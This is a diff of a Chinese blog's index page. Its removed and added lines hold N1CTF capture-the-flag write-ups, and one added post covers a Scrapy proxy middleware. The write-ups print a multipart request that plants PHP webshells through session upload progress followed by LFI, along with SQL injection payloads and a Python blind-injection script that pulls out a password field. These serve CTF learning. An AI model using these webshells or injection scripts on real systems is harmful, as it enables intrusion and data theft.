@@ -151,128 +151,6 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2018-03-13T16:40:00.000Z">2018-03-14</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    6 分钟 读完 (大约 868 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2018/03/n1ctf-easy-harder-php/">N1CTF easy_harder_php非预期解法</a>
-            
-        </h1>
-        <div class="content">
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;上篇文章中复现了官方的预期解法，这里单独将<code>非预期</code>解法拿出来复现一遍并记录解题过程。<code>非预期</code>解法有三种：</p>
-<ul>
-<li><strong>1、session.upload开启导致session包含漏洞</strong></li>
-<li><strong>2、xdebug</strong></li>
-<li><strong>3、/tmp/临时文件竞争</strong></li>
-</ul>
-<p>&emsp;&emsp;本来以为pull下的docker有<code>easy php</code>的环境，但经过检查后却发现不满足条件，所以这篇文章主要起到<code>备忘录</code>的作用，以供以后遇到满足的条件时方便查阅。</p>
-<h2 id="1、session-upload开启导致包含漏洞"><a href="#1、session-upload开启导致包含漏洞" class="headerlink" title="1、session.upload开启导致包含漏洞"></a>1、session.upload开启导致包含漏洞</h2><p>&emsp;&emsp;<code>session.upload_progress.enabled</code>这个参数在php.ini <code>默认开启</code>，需要手动置为<code>Off</code>，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_&#123;your_php_session_id&#125;</span><br></pre></td></tr></table></figure></p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/58.png" width="60%"><br></div><br>&emsp;&emsp;但是从官方拉下来的源码中，发现这个<code>session.upload_progress.enabled</code>参数已经被关闭，所以这个解法就没法复现了。</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/59.png" width="70%"><br></div><br>&emsp;&emsp;所以这里只进行记录这个解法的流程。</p>
-<p>&emsp;&emsp;首先构造一个这样的报文(from @berTrAM)，不断的向服务端发送<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 47.52.246.175:23333</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Content-Length: 648</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">&lt;?=`echo &apos;&lt;?php eval($_REQUEST[bertram])?&gt;&apos;&gt;bertram.php`?&gt;</span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;file2&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;2.asp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt; %eval request(&quot;a&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV--</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;服务器就会在<code>/var/lib/php5/sess_5uu8r952rejihbg033m5mckb17</code>中记录这个上传的文件。接着我们不断刷新生成包含恶意php代码的文件，然后通过LFI包含这个文件<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=../../../../../var/lib/php5/sess_5uu8r952rejihbg033m5mckb17</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;即可getshell</p>
-<h2 id="2、xdebug"><a href="#2、xdebug" class="headerlink" title="2、xdebug"></a>2、xdebug</h2><p>&emsp;&emsp;要使用<code>Xdebug</code>get shell，首先服务器要开启如下参数：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/60.png"><br></div><br>&emsp;&emsp;但pull下来的docker中，这个参数都不被满足，所以又只能记录利用方式，等以后碰到了方便查阅。</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/61.png"><br></div><br>&emsp;&emsp;这里参照<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">rr师傅的博客</a>，首先我们先确定是否可以利用<code>xdebug</code>。</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/62.png"><br></div><br>&emsp;&emsp;当 X-Forwarded-For 的<code>地址</code>（这里就是：ricterz.me）的 9000 端口收到连接请求，就可以确定开启了 Xdebug，且开启了 xdebug.remote_connect_back。</p>
-<p>&emsp;&emsp;再下面的操作就参照师傅的博客就行了，这里因为没有环境就不再<code>照抄</code>了。</p>
-<h2 id="3、-tmp-临时文件竞争"><a href="#3、-tmp-临时文件竞争" class="headerlink" title="3、/tmp/临时文件竞争"></a>3、/tmp/临时文件竞争</h2><p>&emsp;&emsp;要使用<code>临时文件竞争</code>，phpinfo的环境要有如下配置：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/63.png"><br></div><br>&emsp;&emsp;但公开的docker还是不满足条件。。。</p>
-<p>&emsp;&emsp;它大概的原理就是趁系统还没把临时文件删除之前将这个文件包含起来，从而getshell，通常系统的守护进行删除时隔很小，大概在2~3s，所以，我们要使用多线程上传，然后不断刷新包含文件。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>&emsp;&emsp;<a href="https://www.secsearch.top/?kw=n1ctf" target="_blank" rel="noopener">黑塔搜索结果</a><br><br>&emsp;&emsp;<a href="https://xianzhi.aliyun.com/forum/topic/2148" target="_blank" rel="noopener">官方writeup</a><br><br>&emsp;&emsp;<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="noopener">国外大佬-条件竞争writeup</a><br><br>&emsp;&emsp;<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">Xdebug利用</a><br><br>&emsp;&emsp;<a href="http://bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/" target="_blank" rel="noopener">Bendawang</a><br></p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2018-03-11T16:40:00.000Z">2018-03-12</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    5 分钟 读完 (大约 772 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2018/03/n1ctf-writeup/">N1CTF 77777 writeup</a>
-            
-        </h1>
-        <div class="content">
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;这是我及我所在的团队第一次参加<code>正式</code>的CTF比赛，所取得的成绩也还算满意，比赛过程中作者负责<code>web</code>方向，比赛中的成果就是两道<code>77777</code>。</p>
-<h3 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h3><p>&emsp;&emsp;题目描述：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/1.png"><br></div></p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/2.png"><br></div><br>&emsp;&emsp;这道题最坑的就是一开始<code>没有判断出是否注入成功的依据</code>，后面经师兄指导才发现依据就是注入的数字是否已经改变，当然这道题的环境官方也说明每个队注入<code>没有隔离开</code>，造成即使注入成功也可能被别的队刷走，从而影响判断。</p>
-<p>&emsp;&emsp;又因为它是<code>sptintf(&quot;xxx%d%s&quot;)</code>，所以注入应该在<code>str</code>的地方，也就是在<code>hi</code>中进行注入，payload：<code>hi=000 where ord(substr(password, 1, 1))&gt;100</code>，因为是在<code>update users set</code>中注入，所以这里不需要再使用<code>union,select</code>等方法了。完整的payload如下图：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/3.png"><br></div><br>&emsp;&emsp;如果注入成功，则会返回你的<code>flag</code>字段，如：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/4.png"><br></div><br>&emsp;&emsp;由于这个题的环境不稳定，不太适合脚本的判断，所以，就手工注入一遍了。</p>
-<h3 id="77777-2"><a href="#77777-2" class="headerlink" title="77777 2"></a>77777 2</h3><p>&emsp;&emsp;这道题跟上一道提供的描述是一样的，不同的是对<code>hi</code>进行了更严格的过滤，上一道的payload就无效了。</p>
-<p>&emsp;&emsp;这道题过滤了<code>and or || &amp; &amp;&amp;</code>（为了不产生二义，这里用空格分隔），但是唯独没有过滤掉<code>|</code>。所以我们可以选择<code>|</code>进行<code>位注入</code>。然后在检测一下，没有被过滤的是：<code>substr select from if</code>，所以考虑用<code>if</code>替代<code>where</code>进行判断。</p>
-<p>&emsp;&emsp;经过一轮苦逼的测试，终于搞出一个payload：<code>hi=000 |  IF (substr((select substr( pw from 1)),1,1)&gt;&#39;z&#39;,1,0)</code>，这里<code>( pw</code>中间一定要有<code>空格</code>，不然无法绕过。另一个要说的就是<code>pw from 1</code>，它会返回<code>pw字段从1开始的所有值</code>。如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pw = &apos;flag&#123;123456&#125;&apos;</span><br><span class="line">pw from 1 ---&gt; flag&#123;123456&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;payload：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/5.png"><br></div><br>&emsp;&emsp;判断的依据是返回的数字的最后一位，如：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/6.png"><br></div><br>&emsp;&emsp;如果是返回错误则是如下：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/7.png"><br></div></p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/8.png"><br></div></p>
-<blockquote>
-<p>另一个tips就是数字的后一位一定要<code>0</code>，不然如果是<code>1</code>的话就无法判断了。<code>1 |</code>任何也是真。</p>
-</blockquote>
-<p>&emsp;&emsp;再然后就是逐位的判断，有些数字会被过滤掉，这点上不知道是我的payload有问题还是本来就是这样。。。。</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/9.png"><br></div><br>&emsp;&emsp;如上，逐位比较的时候使用<code>+1</code>的方法，如果直接用2,3,4,…的话有些数字<code>会被过滤</code>，还有就是有些字符也会被过滤，但无关flag字段。<br>&emsp;&emsp;附上脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://47.52.137.90:20000/'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">    lc = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(i):</span><br><span class="line">        lc += <span class="hljs-string">'+1'</span></span><br><span class="line">    lc = lc[<span class="hljs-number">1</span>:]</span><br><span class="line">    sql = <span class="hljs-string">'000 |  IF (substr((select substr( pw from 1)),&#123;0&#125;,1)&gt;\'&#123;1&#125;\',1,0)'</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>):</span><br><span class="line">        sqli = sql.format(lc, chr(ch))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="hljs-string">'flag'</span>: <span class="hljs-number">123</span>,</span><br><span class="line">            <span class="hljs-string">'hi'</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment"># print(data)</span></span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        text = html.text</span><br><span class="line">        <span class="hljs-comment"># print(text)</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">'123000'</span> <span class="hljs-keyword">in</span> text:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-03-11T16:40:00.000Z">2018-03-12</time>
                 
                 <div class="level-item">
@@ -339,6 +217,66 @@
 <p><div align="center"><br>    <img src="/images/posts/n1ctf/26.png"><br></div><br>&emsp;&emsp;至此，成功拿到<code>flag</code>。这道题自己学到了很多，也意识到了自己的经验还是不足，以后必将勤加练习，当然还是要留意细节跟善用搜索引擎。。。</p>
 <p>&emsp;&emsp;希望能在这条路上走远一点:)</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://fireshellsecurity.team/n1ctf-funning-eating-cms/" target="_blank" rel="noopener">[<em>]N1CTF 2018 - Funning eating cms</em></a><br><br><a href="http://seaii-blog.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">[]Web中的条件竞争漏洞</a><br><br><a href="https://www.anquanke.com/post/id/84837" target="_blank" rel="noopener">[<em>]GeekPwn2016跨次元CTF Writeup</em></a><br><br><a href="http://sol.logdown.com/posts/2016/07/14/ais3-pre-exam-2016-part-write-up" target="_blank" rel="noopener">[]web</a></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-11T16:40:00.000Z">2018-03-12</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 772 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/n1ctf-writeup/">N1CTF 77777 writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;这是我及我所在的团队第一次参加<code>正式</code>的CTF比赛，所取得的成绩也还算满意，比赛过程中作者负责<code>web</code>方向，比赛中的成果就是两道<code>77777</code>。</p>
+<h3 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h3><p>&emsp;&emsp;题目描述：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/1.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/2.png"><br></div><br>&emsp;&emsp;这道题最坑的就是一开始<code>没有判断出是否注入成功的依据</code>，后面经师兄指导才发现依据就是注入的数字是否已经改变，当然这道题的环境官方也说明每个队注入<code>没有隔离开</code>，造成即使注入成功也可能被别的队刷走，从而影响判断。</p>
+<p>&emsp;&emsp;又因为它是<code>sptintf(&quot;xxx%d%s&quot;)</code>，所以注入应该在<code>str</code>的地方，也就是在<code>hi</code>中进行注入，payload：<code>hi=000 where ord(substr(password, 1, 1))&gt;100</code>，因为是在<code>update users set</code>中注入，所以这里不需要再使用<code>union,select</code>等方法了。完整的payload如下图：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/3.png"><br></div><br>&emsp;&emsp;如果注入成功，则会返回你的<code>flag</code>字段，如：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/4.png"><br></div><br>&emsp;&emsp;由于这个题的环境不稳定，不太适合脚本的判断，所以，就手工注入一遍了。</p>
+<h3 id="77777-2"><a href="#77777-2" class="headerlink" title="77777 2"></a>77777 2</h3><p>&emsp;&emsp;这道题跟上一道提供的描述是一样的，不同的是对<code>hi</code>进行了更严格的过滤，上一道的payload就无效了。</p>
+<p>&emsp;&emsp;这道题过滤了<code>and or || &amp; &amp;&amp;</code>（为了不产生二义，这里用空格分隔），但是唯独没有过滤掉<code>|</code>。所以我们可以选择<code>|</code>进行<code>位注入</code>。然后在检测一下，没有被过滤的是：<code>substr select from if</code>，所以考虑用<code>if</code>替代<code>where</code>进行判断。</p>
+<p>&emsp;&emsp;经过一轮苦逼的测试，终于搞出一个payload：<code>hi=000 |  IF (substr((select substr( pw from 1)),1,1)&gt;&#39;z&#39;,1,0)</code>，这里<code>( pw</code>中间一定要有<code>空格</code>，不然无法绕过。另一个要说的就是<code>pw from 1</code>，它会返回<code>pw字段从1开始的所有值</code>。如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pw = &apos;flag&#123;123456&#125;&apos;</span><br><span class="line">pw from 1 ---&gt; flag&#123;123456&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;payload：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/5.png"><br></div><br>&emsp;&emsp;判断的依据是返回的数字的最后一位，如：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/6.png"><br></div><br>&emsp;&emsp;如果是返回错误则是如下：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/7.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/8.png"><br></div></p>
+<blockquote>
+<p>另一个tips就是数字的后一位一定要<code>0</code>，不然如果是<code>1</code>的话就无法判断了。<code>1 |</code>任何也是真。</p>
+</blockquote>
+<p>&emsp;&emsp;再然后就是逐位的判断，有些数字会被过滤掉，这点上不知道是我的payload有问题还是本来就是这样。。。。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/9.png"><br></div><br>&emsp;&emsp;如上，逐位比较的时候使用<code>+1</code>的方法，如果直接用2,3,4,…的话有些数字<code>会被过滤</code>，还有就是有些字符也会被过滤，但无关flag字段。<br>&emsp;&emsp;附上脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://47.52.137.90:20000/'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">    lc = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(i):</span><br><span class="line">        lc += <span class="hljs-string">'+1'</span></span><br><span class="line">    lc = lc[<span class="hljs-number">1</span>:]</span><br><span class="line">    sql = <span class="hljs-string">'000 |  IF (substr((select substr( pw from 1)),&#123;0&#125;,1)&gt;\'&#123;1&#125;\',1,0)'</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>):</span><br><span class="line">        sqli = sql.format(lc, chr(ch))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="hljs-string">'flag'</span>: <span class="hljs-number">123</span>,</span><br><span class="line">            <span class="hljs-string">'hi'</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment"># print(data)</span></span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        text = html.text</span><br><span class="line">        <span class="hljs-comment"># print(text)</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">'123000'</span> <span class="hljs-keyword">in</span> text:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p>
 
         </div>
         
@@ -848,6 +786,60 @@
 
 
 
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-21T14:20:00.000Z">2017-12-21</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 927 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/scrapy-proxy/">解决Scrapy爬虫卡(停)顿问题</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;&emsp;最近在做爬虫的时候经常遇到<code>爬虫卡顿（停顿）</code>的情况，让人很是苦恼，稍不注意就进程就卡住，在搜索了方法后，最后采用<code>自动代理切换+超时下载件</code>的方法解决。</p>
+<h3 id="编写自动代理中间件"><a href="#编写自动代理中间件" class="headerlink" title="编写自动代理中间件"></a>编写自动代理中间件</h3><p>&emsp;&emsp;在项目的<code>middlewares.py</code>中新建一个自动代理中间件的类，如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyproxyMiddleware</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-string">"""docstring for ProxyMiddleWare"""</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_request</span><span class="hljs-params">(self, request, spider)</span>:</span></span><br><span class="line">        <span class="hljs-string">'''对request对象加上proxy'''</span></span><br><span class="line">        <span class="hljs-comment"># proxy = self.get_random_proxy()</span></span><br><span class="line">        haha = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> haha &gt;= <span class="hljs-number">5</span>:</span><br><span class="line">            print(<span class="hljs-string">'\n随机&#123;&#125;正在使用代理\n'</span>.format(haha))</span><br><span class="line">            proxy = <span class="hljs-string">'http://127.0.0.1:8087'</span></span><br><span class="line">            request.meta[<span class="hljs-string">'proxy'</span>] = proxy</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_response</span><span class="hljs-params">(self, request, response, spider)</span>:</span></span><br><span class="line">        <span class="hljs-string">'''对返回的response处理'''</span></span><br><span class="line">        <span class="hljs-comment"># 如果返回的response状态不是200，重新生成当前request对象</span></span><br><span class="line">        <span class="hljs-keyword">if</span> response.status != <span class="hljs-number">200</span>:</span><br><span class="line">            proxy = <span class="hljs-string">'http://127.0.0.1:8087'</span></span><br><span class="line">            <span class="hljs-comment"># print("this is response ip:" + proxy)</span></span><br><span class="line">            <span class="hljs-comment"># 对当前reque加上代理</span></span><br><span class="line">            request.meta[<span class="hljs-string">'proxy'</span>] = proxy</span><br><span class="line">            <span class="hljs-keyword">return</span> request</span><br><span class="line">        <span class="hljs-keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_exception</span><span class="hljs-params">(self, request, exception, spider)</span>:</span></span><br><span class="line">        <span class="hljs-comment"># 出现异常时（超时）使用代理</span></span><br><span class="line">        print(<span class="hljs-string">"\n出现异常，正在使用代理重试....\n"</span>)</span><br><span class="line">        proxy = <span class="hljs-string">'http://127.0.0.1:8087'</span></span><br><span class="line">        request.meta[<span class="hljs-string">'proxy'</span>] = proxy</span><br><span class="line">        <span class="hljs-keyword">return</span> request</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>process_request()</code>方法是发起请求时调用的，所以如果你希望一开始请求就使用代理就可在这里写上代理地址，这个函数可以返回三个值：<code>None</code>、<code>request</code>、<code>response</code>。<br>如果是返回None，说明不对请求头做任何处理；如果返回request，则按照用户定制的请求头请求网页，如果我们要使用代理则需返回request，不写明写返回也是返回request；response表示不再使用其他下载中间件，直接返回响应结果。</p>
+<p>&emsp;&emsp;这里我使用随机的方法使用代理，毕竟代理流量也是有限度的。我使用的是<code>XX-NET</code>免费代理，它的主要用途是被国人拿来扶墙的，它提供自动IP切换服务，可以很好的为爬虫服务。另一种免费躲避IP限制的方法是使用<code>tor</code>，不过在国内的话需要先科学上网。</p>
+<p>&emsp;&emsp;<code>process_exception()</code>是对爬虫请求是出现的异常情况进行处理的方法，它会捕捉<code>超时、503</code>等异常，当我们出现卡顿或停顿时很有可能就是超时，所以我们要编写这个函数。当返回<code>request</code>时，爬虫会重新使用使用代理进行请求，我们需要的就是这个功能。</p>
